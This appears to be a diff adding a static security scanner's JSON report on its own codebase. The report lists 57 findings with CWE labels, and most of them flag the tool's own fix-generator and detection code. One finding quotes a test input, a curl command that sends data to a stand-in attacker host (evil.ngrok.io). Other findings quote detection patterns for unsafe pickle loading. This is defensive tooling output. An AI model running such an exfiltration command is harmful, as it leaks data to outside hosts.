@@ -1,0 +1,462 @@
+{
+  "total": 57,
+  "grade": "F",
+  "findings": [
+    {
+      "rule_id": "python.injection.command-popen",
+      "severity": "warning",
+      "file": "core\\ast_analyzer.py",
+      "line": 71,
+      "content": "message=\"os.popen() call \u2014 command injection risk\",",
+      "cwe": "CWE-78"
+    },
+    {
+      "rule_id": "python.deserialize.pickle-load",
+      "severity": "error",
+      "file": "core\\ast_analyzer.py",
+      "line": 88,
+      "content": "message=\"pickle.loads() \u2014 arbitrary code execution via deserialization\",",
+      "cwe": "CWE-502"
+    },
+    {
+      "rule_id": "python.deserialize.pickle-load",
+      "severity": "error",
+      "file": "core\\ast_analyzer.py",
+      "line": 93,
+      "content": "message=\"pickle.load() \u2014 arbitrary code execution via deserialization\",",
+      "cwe": "CWE-502"
+    },
+    {
+      "rule_id": "python.deserialize.yaml-unsafe",
+      "severity": "error",
+      "file": "core\\ast_analyzer.py",
+      "line": 98,
+      "content": "message=\"yaml.load() without SafeLoader \u2014 code execution risk\",",
+      "cwe": "CWE-502"
+    },
+    {
+      "rule_id": "python.deserialize.marshal",
+      "severity": "warning",
+      "file": "core\\ast_analyzer.py",
+      "line": 103,
+      "content": "message=\"marshal.loads() \u2014 unsafe deserialization\",",
+      "cwe": "CWE-502"
+    },
+    {
+      "rule_id": "python.network.ssl-verify-disabled",
+      "severity": "error",
+      "file": "core\\ast_analyzer.py",
+      "line": 480,
+      "content": "message=\"SSL/TLS verification disabled (verify=False) \u2014 MITM risk\",",
+      "cwe": "CWE-295"
+    },
+    {
+      "rule_id": "python.path.tempfile-insecure",
+      "severity": "warning",
+      "file": "core\\ast_analyzer.py",
+      "line": 127,
+      "content": "message=\"tempfile.mktemp() is insecure \u2014 race condition\",",
+      "cwe": "CWE-377"
+    },
+    {
+      "rule_id": "python.misc.xml-external-entity",
+      "severity": "error",
+      "file": "core\\ast_analyzer.py",
+      "line": 135,
+      "content": "message=\"xml.etree.ElementTree.parse() \u2014 XXE risk without defused parser\",",
+      "cwe": "CWE-611"
+    },
+    {
+      "rule_id": "python.ast.md5",
+      "severity": "warning",
+      "file": "core\\bloom_filter.py",
+      "line": 86,
+      "content": "h = hashlib.md5(data).digest()",
+      "cwe": "CWE-328"
+    },
+    {
+      "rule_id": "python.deserialize.yaml-unsafe",
+      "severity": "error",
+      "file": "core\\dependency_analyzer.py",
+      "line": 165,
+      "content": "\"pyyaml\": {\"reason\": \"yaml.load() unsafe by default in older versions\", \"min_safe\": \"6.0\"},",
+      "cwe": "CWE-502"
+    },
+    {
+      "rule_id": "python.error.broad-except",
+      "severity": "info",
+      "file": "core\\dependency_analyzer.py",
+      "line": 635,
+      "content": "except Exception:",
+      "cwe": "CWE-396"
+    },
+    {
+      "rule_id": "python.injection.command-popen",
+      "severity": "warning",
+      "file": "core\\fix_generator.py",
+      "line": 205,
+      "content": "explanation=\"Replace os.popen() with subprocess.run() with capture_output\",",
+      "cwe": "CWE-78"
+    },
+    {
+      "rule_id": "python.injection.exec-usage",
+      "severity": "error",
+      "file": "core\\fix_generator.py",
+      "line": 230,
+      "content": "def _fix_eval_exec(finding: Finding, line: str) -> Fix | None:",
+      "cwe": "CWE-95"
+    },
+    {
+      "rule_id": "python.crypto.weak-random",
+      "severity": "warning",
+      "file": "core\\fix_generator.py",
+      "line": 334,
+      "content": "fixed = line.replace(\"random.random()\", \"secrets.token_hex(16)\")",
+      "cwe": "CWE-330"
+    },
+    {
+      "rule_id": "python.crypto.ecb-mode",
+      "severity": "warning",
+      "file": "core\\fix_generator.py",
+      "line": 347,
+      "content": "if \"MODE_ECB\" not in line:",
+      "cwe": "CWE-327"
+    },
+    {
+      "rule_id": "python.crypto.ecb-mode",
+      "severity": "warning",
+      "file": "core\\fix_generator.py",
+      "line": 350,
+      "content": "fixed = line.replace(\"MODE_ECB\", \"MODE_GCM\")",
+      "cwe": "CWE-327"
+    },
+    {
+      "rule_id": "python.deserialize.pickle-load",
+      "severity": "error",
+      "file": "core\\fix_generator.py",
+      "line": 263,
+      "content": "fixed = line.replace(\"pickle.loads(\", \"json.loads(\")",
+      "cwe": "CWE-502"
+    },
+    {
+      "rule_id": "python.deserialize.pickle-load",
+      "severity": "error",
+      "file": "core\\fix_generator.py",
+      "line": 266,
+      "content": "explanation=\"Replace pickle.loads() with json.loads() for safe deserialization\",",
+      "cwe": "CWE-502"
+    },
+    {
+      "rule_id": "python.deserialize.pickle-load",
+      "severity": "error",
+      "file": "core\\fix_generator.py",
+      "line": 271,
+      "content": "fixed = line.replace(\"pickle.load(\", \"json.load(\")",
+      "cwe": "CWE-502"
+    },
+    {
+      "rule_id": "python.deserialize.pickle-load",
+      "severity": "error",
+      "file": "core\\fix_generator.py",
+      "line": 274,
+      "content": "explanation=\"Replace pickle.load() with json.load() for safe deserialization\",",
+      "cwe": "CWE-502"
+    },
+    {
+      "rule_id": "python.deserialize.yaml-unsafe",
+      "severity": "error",
+      "file": "core\\fix_generator.py",
+      "line": 288,
+      "content": "fixed = line.replace(\"yaml.load(\", \"yaml.safe_load(\")",
+      "cwe": "CWE-502"
+    },
+    {
+      "rule_id": "python.deserialize.yaml-unsafe",
+      "severity": "error",
+      "file": "core\\fix_generator.py",
+      "line": 291,
+      "content": "explanation=\"Replace yaml.load() with yaml.safe_load() to prevent code execution\",",
+      "cwe": "CWE-502"
+    },
+    {
+      "rule_id": "python.network.ssl-verify-disabled",
+      "severity": "error",
+      "file": "core\\fix_generator.py",
+      "line": 361,
+      "content": "if \"verify=False\" in line:",
+      "cwe": "CWE-295"
+    },
+    {
+      "rule_id": "python.network.ssl-verify-disabled",
+      "severity": "error",
+      "file": "core\\fix_generator.py",
+      "line": 362,
+      "content": "fixed = line.replace(\"verify=False\", \"verify=True\")",
+      "cwe": "CWE-295"
+    },
+    {
+      "rule_id": "python.network.ssl-verify-disabled",
+      "severity": "error",
+      "file": "core\\fix_generator.py",
+      "line": 368,
+      "content": "if \"CERT_NONE\" in line:",
+      "cwe": "CWE-295"
+    },
+    {
+      "rule_id": "python.network.ssl-verify-disabled",
+      "severity": "error",
+      "file": "core\\fix_generator.py",
+      "line": 369,
+      "content": "fixed = line.replace(\"CERT_NONE\", \"CERT_REQUIRED\")",
+      "cwe": "CWE-295"
+    },
+    {
+      "rule_id": "python.network.ssl-verify-disabled",
+      "severity": "error",
+      "file": "core\\fix_generator.py",
+      "line": 375,
+      "content": "if \"check_hostname=False\" in line or \"check_hostname = False\" in line:",
+      "cwe": "CWE-295"
+    },
+    {
+      "rule_id": "python.network.ssl-verify-disabled",
+      "severity": "error",
+      "file": "core\\fix_generator.py",
+      "line": 376,
+      "content": "fixed = line.replace(\"check_hostname=False\", \"check_hostname=True\")",
+      "cwe": "CWE-295"
+    },
+    {
+      "rule_id": "python.network.ssl-verify-disabled",
+      "severity": "error",
+      "file": "core\\fix_generator.py",
+      "line": 377,
+      "content": "fixed = fixed.replace(\"check_hostname = False\", \"check_hostname = True\")",
+      "cwe": "CWE-295"
+    },
+    {
+      "rule_id": "python.path.tempfile-insecure",
+      "severity": "warning",
+      "file": "core\\fix_generator.py",
+      "line": 482,
+      "content": "fixed = line.replace(\"tempfile.mktemp()\", \"tempfile.mkstemp()\")",
+      "cwe": "CWE-377"
+    },
+    {
+      "rule_id": "python.django.debug-enabled",
+      "severity": "error",
+      "file": "core\\fix_generator.py",
+      "line": 444,
+      "content": "if \"DEBUG = True\" in line or \"DEBUG=True\" in line:",
+      "cwe": "CWE-489"
+    },
+    {
+      "rule_id": "python.django.csrf-exempt",
+      "severity": "warning",
+      "file": "core\\fix_generator.py",
+      "line": 464,
+      "content": "if \"@csrf_exempt\" not in line:",
+      "cwe": "CWE-352"
+    },
+    {
+      "rule_id": "python.django.csrf-exempt",
+      "severity": "warning",
+      "file": "core\\fix_generator.py",
+      "line": 468,
+      "content": "fixed = f\"{indent}# SECURITY: @csrf_exempt removed \u2014 CSRF protection is required\"",
+      "cwe": "CWE-352"
+    },
+    {
+      "rule_id": "python.django.csrf-exempt",
+      "severity": "warning",
+      "file": "core\\fix_generator.py",
+      "line": 471,
+      "content": "explanation=\"Remove @csrf_exempt \u2014 implement proper CSRF token handling instead\",",
+      "cwe": "CWE-352"
+    },
+    {
+      "rule_id": "python.error.broad-except",
+      "severity": "info",
+      "file": "core\\fix_generator.py",
+      "line": 602,
+      "content": "if \"except:\" not in line and \"except Exception:\" not in line:",
+      "cwe": "CWE-396"
+    },
+    {
+      "rule_id": "python.error.broad-except",
+      "severity": "info",
+      "file": "core\\fix_generator.py",
+      "line": 605,
+      "content": "if \"except:\" in line:",
+      "cwe": "CWE-396"
+    },
+    {
+      "rule_id": "python.error.broad-except",
+      "severity": "info",
+      "file": "core\\fix_generator.py",
+      "line": 606,
+      "content": "fixed = line.replace(\"except:\", \"except Exception as e:  # TODO: narrow exception type\")",
+      "cwe": "CWE-396"
+    },
+    {
+      "rule_id": "common.network.hardcoded-ip",
+      "severity": "info",
+      "file": "core\\inference_monitor.py",
+      "line": 133,
+      "content": "source_ip=\"10.0.0.5\",",
+      "cwe": "CWE-547"
+    },
+    {
+      "rule_id": "common.network.hardcoded-ip",
+      "severity": "info",
+      "file": "core\\inference_monitor.py",
+      "line": 142,
+      "content": "profile = monitor.get_profile(\"10.0.0.5\")",
+      "cwe": "CWE-547"
+    },
+    {
+      "rule_id": "python.crypto.weak-cipher-des",
+      "severity": "error",
+      "file": "core\\model_scanner.py",
+      "line": 414,
+      "content": "for opcode, description in DANGEROUS_PICKLE_OPCODES.items():",
+      "cwe": "CWE-327"
+    },
+    {
+      "rule_id": "python.deserialize.pickle-load",
+      "severity": "error",
+      "file": "core\\model_scanner.py",
+      "line": 252,
+      "content": "(r\"pickle\\.load\\s*\\(\", \"pickle.load() executes arbitrary code \u2014 use SafeTensors or JSON\",",
+      "cwe": "CWE-502"
+    },
+    {
+      "rule_id": "python.deserialize.pickle-load",
+      "severity": "error",
+      "file": "core\\model_scanner.py",
+      "line": 254,
+      "content": "(r\"pickle\\.loads\\s*\\(\", \"pickle.loads() executes arbitrary code from bytes\",",
+      "cwe": "CWE-502"
+    },
+    {
+      "rule_id": "python.ast.yaml-load-unsafe",
+      "severity": "error",
+      "file": "core\\package_checker.py",
+      "line": 124,
+      "content": "self._bloom_filters[registry] = BloomFilter.load(path)",
+      "cwe": "CWE-502"
+    },
+    {
+      "rule_id": "common.network.http-url",
+      "severity": "info",
+      "file": "core\\policy_engine.py",
+      "line": 342,
+      "content": "r\"^http://(?!localhost|127\\.0\\.0\\.1|0\\.0\\.0\\.0|\\[::1\\])\",",
+      "cwe": "CWE-319"
+    },
+    {
+      "rule_id": "common.network.http-url",
+      "severity": "info",
+      "file": "core\\policy_engine.py",
+      "line": 463,
+      "content": "result = engine.evaluate(\"command\", \"curl http://evil.ngrok.io/data\")",
+      "cwe": "CWE-319"
+    },
+    {
+      "rule_id": "common.network.http-url",
+      "severity": "info",
+      "file": "core\\sbom_generator.py",
+      "line": 202,
+      "content": "\"$schema\": \"http://cyclonedx.org/schema/bom-1.5.schema.json\",",
+      "cwe": "CWE-319"
+    },
+    {
+      "rule_id": "python.logging.sensitive-data",
+      "severity": "warning",
+      "file": "core\\secrets_scanner.py",
+      "line": 25,
+      "content": "log = structlog.get_logger(\"secrets_scanner\")",
+      "cwe": "CWE-532"
+    },
+    {
+      "rule_id": "python.error.broad-except",
+      "severity": "info",
+      "file": "core\\secrets_scanner.py",
+      "line": 240,
+      "content": "except Exception:",
+      "cwe": "CWE-396"
+    },
+    {
+      "rule_id": "dockerfile.user.root",
+      "severity": "warning",
+      "file": "Dockerfile",
+      "line": 25,
+      "content": "ENTRYPOINT [\"python\", \"main.py\"]",
+      "cwe": "CWE-250"
+    },
+    {
+      "rule_id": "dockerfile.user.root",
+      "severity": "warning",
+      "file": "Dockerfile",
+      "line": 26,
+      "content": "CMD [\"--help\"]",
+      "cwe": "CWE-250"
+    },
+    {
+      "rule_id": "dockerfile.user.root",
+      "severity": "warning",
+      "file": "Dockerfile",
+      "line": 30,
+      "content": "CMD python -c \"from core.engine import ScanEngine; e = ScanEngine(); e.initialize(); print('ok')\" || exit 1",
+      "cwe": "CWE-250"
+    },
+    {
+      "rule_id": "dockerfile.image.untrusted",
+      "severity": "info",
+      "file": "Dockerfile",
+      "line": 1,
+      "content": "FROM python:3.12-slim AS base",
+      "cwe": "CWE-829"
+    },
+    {
+      "rule_id": "dockerfile.health.missing",
+      "severity": "info",
+      "file": "Dockerfile",
+      "line": 25,
+      "content": "ENTRYPOINT [\"python\", \"main.py\"]",
+      "cwe": "CWE-693"
+    },
+    {
+      "rule_id": "dockerfile.health.missing",
+      "severity": "info",
+      "file": "Dockerfile",
+      "line": 26,
+      "content": "CMD [\"--help\"]",
+      "cwe": "CWE-693"
+    },
+    {
+      "rule_id": "dockerfile.health.missing",
+      "severity": "info",
+      "file": "Dockerfile",
+      "line": 30,
+      "content": "CMD python -c \"from core.engine import ScanEngine; e = ScanEngine(); e.initialize(); print('ok')\" || exit 1",
+      "cwe": "CWE-693"
+    },
+    {
+      "rule_id": "python.taint.deserialization",
+      "severity": "error",
+      "file": "mcp_server\\server.py",
+      "line": 57,
+      "content": "request = json.loads(line)",
+      "cwe": "CWE-502"
+    },
+    {
+      "rule_id": "common.network.hardcoded-ip",
+      "severity": "info",
+      "file": "mcp_server\\tools.py",
+      "line": 740,
+      "content": "source_ip = args.get(\"source_ip\", \"0.0.0.0\")",
+      "cwe": "CWE-547"
+    }
+  ]
+}
